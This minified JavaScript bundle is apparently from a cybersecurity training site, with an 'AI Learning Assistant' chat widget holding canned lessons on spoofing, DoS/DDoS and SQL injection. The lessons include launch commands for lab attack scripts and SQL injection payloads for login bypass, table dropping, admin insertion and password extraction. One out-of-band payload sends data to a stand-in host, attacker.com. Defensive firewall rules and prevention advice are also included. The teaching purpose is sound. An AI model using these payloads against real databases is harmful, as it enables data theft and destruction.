import{r,j as e,g as C,c as U,L as A}from"./index-Cw1DFOQ-.js";import{G as O}from"./GoogleTranslateLanguageSelector-pw5Yfuop.js";const g={spoofing:{topics:{"What is Spoofing?":{content:"Spoofing is a type of cyber attack where an attacker disguises themselves as a trusted source to gain unauthorized access, steal data, or spread malware. The attacker falsifies data to hide their true identity and pretends to be a legitimate entity or device to deceive systems and users."},"DNS Spoofing Commands":{content:`Here are the key DNS Spoofing commands and their explanations:

1. Detection Phase:
\`\`\`
cd ~/dns_spoofing
python3 dnspt1.py
cat /etc/resolv.conf
nslookup cyberhub.com
\`\`\`
• dnspt1.py: Performs comprehensive DNS spoofing checks
• cat /etc/resolv.conf: Displays DNS resolver configuration
• nslookup: Tests domain resolution to detect hijacking

2. Analysis Phase:
\`\`\`
python3 dnspt2.py
dig @8.8.8.8 cyberhub.com
grep cyberhub.com /etc/hosts
\`\`\`
• dnspt2.py: Runs deeper analysis
• dig: Queries trusted DNS server to verify resolution
• grep: Checks for malicious host file entries

3. Remediation Phase:
\`\`\`
python3 dnspt3.py
sudo sed -i '/cyberhub.com/d' /etc/hosts
grep 'cyberhub.com' /etc/hosts
echo '172.67.182.31 cyberhub.com' | sudo tee -a /etc/hosts
sudo systemd-resolve --flush-caches
nslookup cyberhub.com
curl -Is https://cyberhub.com | head -n 1
\`\`\`
• dnspt3.py: Guides through fixing DNS spoofing
• sed: Removes malicious entries
• tee: Adds correct IP mapping
• systemd-resolve: Clears DNS cache
• curl: Tests HTTPS connection`},"IP Spoofing Commands":{content:`Here are the key IP Spoofing commands and their explanations:

1. Basic IP Spoofing:
\`\`\`
python3 ipspoofpt1.py
ip a
ip route
ping -c 3 192.168.1.100
arp -a
\`\`\`
• ipspoofpt1.py: Creates and sends packets with forged source IP
• ip a: Shows network interface information
• ip route: Displays routing table
• ping: Tests connectivity
• arp -a: Shows IP-to-MAC address mappings

2. Advanced IP Spoofing:
\`\`\`
python3 ipspoofpt2.py
sudo tcpdump -i eth0 -n 'arp' -c 5
sudo arp -d 192.168.1.1
sudo arp -s 192.168.1.1 00:1a:2b:3c:4d:5e
\`\`\`
• ipspoofpt2.py: Performs IP flooding with multiple spoofed addresses
• tcpdump: Monitors ARP traffic
• arp -d: Deletes ARP entry
• arp -s: Adds static ARP entry`}}},dos:{topics:{"What is DoS/DDoS?":{content:`A Denial of Service (DoS) attack aims to make a service, network, or system unavailable to its intended users by overwhelming it with traffic or requests. There are several types:

1. DoS Attack: Single source overwhelming a target
2. DDoS Attack: Multiple sources (botnets) attacking simultaneously
3. Slowloris Attack: Keeps many HTTP connections open indefinitely

These attacks can cause service disruption, financial losses, and reputational damage.`},"Basic DoS Attack Commands":{content:`Here are the commands for executing and mitigating a basic DoS attack:

1. Launch Attack:
\`\`\`
sudo python3 launch_dos.py
\`\`\`
• sudo: Runs with superuser privileges
• python3: Invokes Python interpreter
• launch_dos.py: Script that initiates DoS attack

2. Stop Attack:
\`\`\`
sudo iptables -A INPUT -s 127.0.0.3 -j DROP
\`\`\`
• iptables: Linux firewall utility
• -A INPUT: Appends rule to INPUT chain
• -s 127.0.0.3: Specifies source IP
• -j DROP: Drops matching packets`},"DDoS Attack Commands":{content:`Here are the commands for executing and mitigating a DDoS attack:

1. Launch Attack:
\`\`\`
sudo python3 ddos.py
\`\`\`
• sudo: Runs with superuser privileges
• python3: Invokes Python interpreter
• ddos.py: Script that coordinates multiple attack sources

2. Stop Attack:
\`\`\`
sudo iptables -A INPUT -s 127.0.0.0/24 -j DROP
\`\`\`
• iptables: Linux firewall utility
• -A INPUT: Appends rule to INPUT chain
• -s 127.0.0.0/24: Blocks entire IP range
• -j DROP: Drops matching packets

Key difference from DoS: DDoS uses multiple source IPs (botnets) for the attack.`},"Slowloris Attack Commands":{content:`Here are the commands for executing and mitigating a Slowloris attack:

1. Launch Attack:
\`\`\`
sudo python3 launch_slowloris.py
\`\`\`
• sudo: Runs with superuser privileges
• python3: Invokes Python interpreter
• launch_slowloris.py: Script that keeps connections open indefinitely

2. Stop Attack:
\`\`\`
sudo iptables -A INPUT -p tcp --syn --dport 4000 -m connlimit --connlimit-above 20 -j DROP
\`\`\`
• -p tcp --syn: Matches new TCP connections
• --dport 4000: Targets specific port
• -m connlimit --connlimit-above 20: Limits connections per IP
• -j DROP: Drops excess connections

Slowloris is unique because it uses minimal bandwidth but exhausts server resources by keeping connections open.`},"HTTP Flood Attack":{content:`Here are the commands for executing and mitigating an HTTP Flood attack:

1. Launch Attack:
\`\`\`
sudo python3 http_flood.py
\`\`\`
• sudo: Runs with superuser privileges
• python3: Invokes Python interpreter
• http_flood.py: Script that sends massive HTTP requests

2. Stop Attack:
\`\`\`
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
\`\`\`
• -p tcp --dport 80: Targets HTTP port
• -m limit: Uses limit module
• --limit 25/minute: Allows 25 new connections per minute
• --limit-burst 100: Allows burst of 100 connections
• -j ACCEPT: Accepts packets matching these criteria

HTTP Flood attacks target web servers by overwhelming them with valid HTTP requests.`},"Common DoS/DDoS Attacks":{content:`Overview of common DoS/DDoS attack types:

1. Volume Based Attacks:
• UDP Flood: Sends large UDP packets
• ICMP Flood: Overwhelms with ping requests
• DNS Amplification: Uses DNS servers to amplify traffic

2. Protocol Attacks:
• SYN Flood: Exploits TCP handshake
• Ping of Death: Sends malformed ping packets
• Smurf Attack: Uses broadcast addresses

3. Application Layer Attacks:
• HTTP Flood: Overwhelms web servers
• Slowloris: Keeps connections open
• Zero-day DDoS: Exploits unknown vulnerabilities

4. Multi-Vector Attacks:
• Combines multiple attack types
• Harder to detect and mitigate
• Requires comprehensive defense`},"Defense Strategies":{content:`Key strategies to protect against DoS/DDoS attacks:

1. Traffic Analysis:
• Monitor network traffic patterns
• Set up intrusion detection systems
• Analyze logs for anomalies

2. Rate Limiting:
• Implement request rate limits
• Set connection timeouts
• Use connection limiting per IP

3. Firewall Rules:
• Configure iptables properly
• Block suspicious IP ranges
• Filter malicious traffic

4. Server Configuration:
• Increase resource limits
• Configure timeout settings
• Implement reverse proxy

5. DDoS Mitigation Services:
• Use cloud-based protection
• Implement load balancing
• Deploy traffic scrubbing`}}},sql:{topics:{"What is SQL Injection?":{content:`SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Common types include:

1. Classic SQL Injection:
• Directly visible results
• Error messages provide feedback
• Immediate impact on query execution

2. Blind SQL Injection:
• No visible feedback
• Uses boolean conditions
• Time-based techniques

3. Union-Based SQL Injection:
• Combines results with legitimate query
• Requires matching column numbers
• Extracts data from other tables

These vulnerabilities can lead to unauthorized data access, modification, or deletion.`},"Classic SQL Injection":{content:`Classic SQL injection techniques and examples:

1. Basic Injection:
\`\`\`
' OR '1'='1
admin' --
' OR 1=1; --
\`\`\`
• Bypasses login forms
• Shows all records
• Comments out remaining query

2. Error-Based:
\`\`\`
' AND 1=CONVERT(int, @@version) --
' AND 1=db_name() --
\`\`\`
• Forces database errors
• Extracts information from error messages

3. Stacked Queries:
\`\`\`
'; DROP TABLE users --
'; INSERT INTO admin VALUES ('hacker','pass') --
\`\`\`
• Executes multiple queries
• Can modify database structure`},"Blind SQL Injection":{content:`Techniques for blind SQL injection:

1. Boolean-Based:
\`\`\`
' AND 1=1 --    (true condition)
' AND 1=2 --    (false condition)
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM users),1,1))=65 --
\`\`\`
• Uses true/false responses
• Extracts data one character at time
• Requires many requests

2. Time-Based:
\`\`\`
'; IF 1=1 WAITFOR DELAY '0:0:5' --
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5' --
\`\`\`
• Uses time delays to infer results
• Works when no visible feedback
• Slower but reliable

3. Out-of-Band:
\`\`\`
'; DECLARE @q VARCHAR(1024);SET @q=CONCAT('\\\\',(<query>),'.attacker.com\\a.txt');EXEC master..xp_dirtree @q--
\`\`\`
• Extracts data via DNS/HTTP
• Bypasses network restrictions
• Useful for data exfiltration`},"Union-Based Injection":{content:`UNION-based SQL injection techniques:

1. Column Number Discovery:
\`\`\`
' ORDER BY 1--    (increment until error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
\`\`\`
• Determines number of columns
• Matches column count with original query
• Required for successful UNION

2. Data Extraction:
\`\`\`
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,@@version--
' UNION SELECT table_name,NULL FROM information_schema.tables--
\`\`\`
• Combines results with legitimate query
• Extracts data from other tables
• Can retrieve schema information

3. Advanced Techniques:
\`\`\`
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--
\`\`\`
• Combines multiple columns
• Extracts bulk data
• Optimizes number of requests`},"Prevention Methods":{content:`Key methods to prevent SQL injection:

1. Parameterized Queries:
\`\`\`
// Instead of:
"SELECT * FROM users WHERE username='" + username + "'"

// Use:
"SELECT * FROM users WHERE username=?"
\`\`\`
• Use prepared statements
• Never concatenate user input

2. Input Validation:
• Whitelist allowed characters
• Validate data type and length
• Escape special characters

3. Least Privilege:
• Use restricted database accounts
• Limit database permissions
• Separate accounts for different operations

4. WAF Configuration:
• Enable SQL injection rules
• Monitor and log suspicious queries
• Block known attack patterns`}}}},q=({pageType:i,isOpen:d,onClose:m})=>{const[p,c]=r.useState([]),[h,x]=r.useState(""),[u,y]=r.useState(!1),[b,I]=r.useState(!1),S=r.useRef(null),f=r.useRef(null),D=()=>{var t;(t=S.current)==null||t.scrollIntoView({behavior:"smooth"})};r.useEffect(()=>{D()},[p]),r.useEffect(()=>{var t;if(d&&i){const s=((t=g[i])==null?void 0:t.topics)||{},o=Object.keys(s);c([{type:"assistant",text:`Welcome! I'm your AI assistant for ${i.toUpperCase()}. Choose a topic:`,topics:o.map(n=>{var a;return{title:n,content:(a=s[n])==null?void 0:a.content}})}])}},[d,i]),r.useEffect(()=>()=>{f.current&&clearTimeout(f.current)},[]);const N=t=>t.includes("```")?t.split("```").map((s,o)=>o%2===1?e.jsx("pre",{className:"code-block",children:e.jsx("code",{children:s.trim()})},o):e.jsx("p",{children:s.split(`
`).map((n,a)=>e.jsxs(C.Fragment,{children:[n,e.jsx("br",{})]},a))},o)):t.split(`
`).map((s,o)=>e.jsxs(C.Fragment,{children:[s,e.jsx("br",{})]},o)),P=t=>{var o;const s=(o=g[i])==null?void 0:o.topics[t.title];s&&c(n=>[...n,{type:"user",text:`Tell me about ${t.title}`},{type:"assistant",text:s.content,isFormatted:!0}])},k=async t=>{var o;if(t==null||t.preventDefault(),!h.trim()||u)return;const s={type:"user",text:h.trim()};c(n=>[...n,s]),x(""),y(!0);try{const n=((o=g[i])==null?void 0:o.topics)||{},a=Object.entries(n).find(([l])=>l.toLowerCase().includes(s.text.toLowerCase())||s.text.toLowerCase().includes(l.toLowerCase()));if(a){c(l=>[...l,{type:"assistant",text:a[1].content,isFormatted:!0}]),y(!1);return}const E=new Promise((l,R)=>{f.current=setTimeout(()=>{R(new Error("Response took too long. Please try again."))},2e4)}),L=`Context: ${i} cybersecurity.
Q: ${s.text}
Give a brief, focused answer about ${i}.`,v=await Promise.race([U(L),E]);if(clearTimeout(f.current),!v)throw new Error("No response received");c(l=>[...l,{type:"assistant",text:v}])}catch(n){console.error("Error in handleSendMessage:",n),c(a=>[...a,{type:"assistant",text:n.message||"I apologize, but I encountered an error. Please try again."}])}finally{y(!1)}},T=t=>{t.key==="Enter"&&!t.shiftKey&&(t.preventDefault(),k())},j=()=>{I(!b)},w=()=>{var o;const t=((o=g[i])==null?void 0:o.topics)||{},s=Object.keys(t);c([{type:"assistant",text:`Welcome! I'm your AI assistant for ${i?i.toUpperCase():""}. Choose a topic:`,topics:s.map(n=>{var a;return{title:n,content:(a=t[n])==null?void 0:a.content}})}])};return d?e.jsx("div",{className:"ai-assistant-container",onClick:t=>{t.target===t.currentTarget&&m()},children:e.jsxs("div",{className:`ai-assistant-window ${b?"expanded":""}`,children:[e.jsxs("div",{className:"ai-assistant-header",children:[e.jsxs("div",{className:"header-left",children:[e.jsx("span",{role:"img","aria-label":"AI",className:"ai-icon",children:"✨"}),e.jsx("h3",{children:"AI Learning Assistant"})]}),e.jsxs("div",{className:"header-right",children:[e.jsx("button",{className:"header-icon-button",onClick:w,"aria-label":"Clear",children:e.jsx("span",{role:"img",children:"🗑️"})}),e.jsx("button",{className:"header-icon-button",onClick:j,"aria-label":"Expand",children:e.jsx("span",{children:b?"⤢":"⤡"})}),e.jsx("button",{className:"header-icon-button",onClick:m,"aria-label":"Close",children:e.jsx("span",{children:"×"})})]})]}),e.jsx("div",{className:"ai-assistant-body",children:e.jsxs("div",{className:"ai-chat-messages",children:[p.map((t,s)=>e.jsxs("div",{className:`ai-message ${t.type==="user"?"ai-user-message":"ai-assistant-message"}`,children:[t.isFormatted?N(t.text):t.text,t.topics&&e.jsx("div",{className:"ai-topics",children:t.topics.map((o,n)=>e.jsx("button",{className:"ai-topic-button",onClick:()=>P(o),children:o.title},n))})]},s)),u&&e.jsx("div",{className:"ai-message ai-assistant-message",children:e.jsx("div",{className:"typing-indicator",children:"Thinking..."})}),e.jsx("div",{ref:S})]})}),e.jsxs("div",{className:"ai-chat-input",children:[e.jsx("input",{type:"text",value:h,onChange:t=>x(t.target.value),onKeyPress:T,placeholder:u?"Please wait...":"Ask me anything about this topic",disabled:u}),e.jsx("button",{onClick:k,className:"send-button","aria-label":"Send",disabled:u||!h.trim(),children:e.jsx("span",{children:u?"...":"➤"})})]})]})}):null},B=({pageType:i})=>{const[d,m]=r.useState(!1);return e.jsxs(e.Fragment,{children:[e.jsxs("div",{style:{position:"sticky",top:0,zIndex:100,width:"100%",backgroundColor:"#000000",borderBottom:"1px solid #2d3748",display:"flex",justifyContent:"space-between",alignItems:"center",height:"64px",padding:"0 24px"},children:[e.jsx("div",{style:{display:"flex",alignItems:"center",gap:"24px"},children:e.jsx(A,{to:"/",style:{color:"#fff",textDecoration:"none",fontSize:"24px",fontWeight:"bold"},children:"C_"})}),e.jsxs("button",{onClick:()=>m(!d),style:{position:"absolute",left:"50%",transform:"translateX(-50%)",backgroundColor:"#0c1221",border:"1px solid #2d3748",borderRadius:"6px",color:"#fff",padding:"8px 16px",display:"flex",alignItems:"center",gap:"8px",cursor:"pointer",fontSize:"14px",transition:"all 0.2s",width:"auto",minWidth:"250px",justifyContent:"center"},onMouseEnter:p=>p.target.style.backgroundColor="#1e293b",onMouseLeave:p=>p.target.style.backgroundColor="#0c1221",children:[e.jsx("span",{role:"img","aria-label":"AI",style:{fontSize:"16px"},children:"✨"}),"Ask the AI Learning Assistant"]}),e.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"24px"},children:[e.jsx(O,{}),e.jsx("button",{style:{backgroundColor:"transparent",border:"none",color:"#fff",cursor:"pointer",fontSize:"14px"},children:"Tools"}),e.jsx(A,{to:"/profile",style:{width:"32px",height:"32px",borderRadius:"50%",backgroundColor:"#30363D",display:"flex",alignItems:"center",justifyContent:"center",textDecoration:"none"},children:"👤"})]})]}),e.jsx(q,{pageType:i,isOpen:d,onClose:()=>m(!1)})]})};export{B as A};
//# sourceMappingURL=AttackPagesHeader-DyV9K30K.js.map
